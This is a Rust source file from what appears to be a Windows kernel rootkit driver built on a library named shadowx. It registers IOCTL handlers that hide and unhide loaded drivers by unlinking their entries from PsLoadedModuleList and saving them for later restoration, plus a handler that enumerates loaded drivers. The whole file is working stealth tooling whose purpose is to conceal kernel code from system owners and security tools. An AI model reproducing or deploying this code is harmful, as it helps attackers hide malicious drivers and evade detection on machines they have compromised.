use {
    alloc::boxed::Box,
    spin::{Lazy, Mutex},
    shadowx::error::ShadowError,
    alloc::{string::ToString, vec::Vec},
    core::sync::atomic::{AtomicPtr, Ordering},
    wdk_sys::{
        IO_STACK_LOCATION, IRP, 
        STATUS_SUCCESS
    },
};

use {
    crate::utils::{
        get_input_buffer,
        get_output_buffer,
        ioctls::IoctlManager
    },
    common::{
        vars::MAX_DRIVER,
        structs::{DriverInfo, TargetDriver},
        ioctls::{
            ENUMERATE_DRIVER, 
            HIDE_UNHIDE_DRIVER
        }, 
    }, 
};

/// Static structure to store hidden driver information.
/// 
/// This structure keeps track of the drivers that have been hidden, including their
/// `LDR_DATA_TABLE_ENTRY` and the previous list entries in `PsLoadedModuleList`.
static DRIVER_INFO_HIDE: Lazy<Mutex<Vec<TargetDriver>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_DRIVER))); 

/// Registers the IOCTL handlers for driver-related operations.
///
/// This function registers two handlers: one for hiding/unhiding drivers and another for
/// enumerating the active drivers on the system. The handlers are mapped to their respective
/// IOCTL codes.
///
/// # Arguments
/// 
/// * `ioctls` - A mutable reference to an `IoctlManager` where the driver-related IOCTL handlers
///   will be registered.
pub fn register_driver_ioctls(ioctls: &mut IoctlManager) {
    // Hiding / Unhiding a driver from the PsLoadedModuleList.
    ioctls.register_handler(HIDE_UNHIDE_DRIVER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            let target_driver = get_input_buffer::<TargetDriver>(stack)?;
            let driver_name = &(*target_driver).name;

            // Perform the operation based on whether we are hiding or unhiding the driver.
            let status = if (*target_driver).enable {
                // Hide the driver and store its previous entries.
                let (previous_list, previos_ldr_data) = shadowx::Driver::hide_driver(&driver_name)?;
                let mut driver_info = DRIVER_INFO_HIDE.lock();

                // Store the previous list entry and LDR_DATA_TABLE_ENTRY for later restoration.
                let ldr_data_ptr = Box::into_raw(Box::new(previos_ldr_data));
                let list_ptr = Box::into_raw(Box::new(previous_list));

                driver_info.push(TargetDriver {
                    name: driver_name.clone(),
                    driver_entry: AtomicPtr::new(ldr_data_ptr),
                    list_entry: AtomicPtr::new(list_ptr as *mut _),
                    ..Default::default()
                });

                STATUS_SUCCESS
            } else {
                // Unhide the driver by restoring its list entry and LDR_DATA_TABLE_ENTRY.
                let (list_entry, ldr_data) = DRIVER_INFO_HIDE.lock()
                    .iter()
                    .find(|p| p.name == *driver_name)
                    .map(|process| 
                        (process.list_entry.load(Ordering::SeqCst), 
                        process.driver_entry.load(Ordering::SeqCst)
                    ))
                    .ok_or(ShadowError::DriverNotFound(driver_name.to_string()))?;

                shadowx::Driver::unhide_driver(&driver_name, list_entry as *mut _, ldr_data)?
            };
            
            // Set the size of the returned information.
            (*irp).IoStatus.Information = size_of::<TargetDriver>() as u64;
            Ok(status)
        }
    }));

    // Enumerating active drivers on the system.
    ioctls.register_handler(ENUMERATE_DRIVER, Box::new(|irp: *mut IRP, _: *mut IO_STACK_LOCATION| {
        unsafe {
            // Get the output buffer for returning the driver information.
            let driver_info = get_output_buffer::<DriverInfo>(irp)?;

            // Enumerate the drivers currently loaded in the system.
            let drivers = shadowx::Driver::enumerate_driver()?;

            // Copy driver information into the output buffer.
            for (index, module) in drivers.iter().enumerate() {
                let info_ptr = driver_info.add(index);

                // Copy the driver name and other information.
                core::ptr::copy_nonoverlapping(module.name.as_ptr(), (*info_ptr).name.as_mut_ptr(), module.name.len());
                (*info_ptr).address = module.address;
                (*info_ptr).index = index as u8;
            }

            // Set the size of the returned information.
            (*irp).IoStatus.Information = (drivers.len() * size_of::<DriverInfo>()) as u64;
            Ok(STATUS_SUCCESS)
        }
    }));
}